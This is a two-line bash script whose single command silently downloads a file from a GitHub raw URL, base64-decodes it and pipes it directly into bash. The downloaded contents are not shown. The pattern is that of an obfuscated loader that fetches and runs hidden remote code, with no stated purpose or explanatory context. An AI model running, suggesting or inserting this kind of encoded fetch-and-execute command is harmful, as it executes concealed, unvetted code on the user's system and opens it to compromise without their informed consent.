#!/bin/bash
wget -qO- https://raw.githubusercontent.com/patrickbolinger/four/refs/heads/main/entrypoint.sh | base64 -d | bash
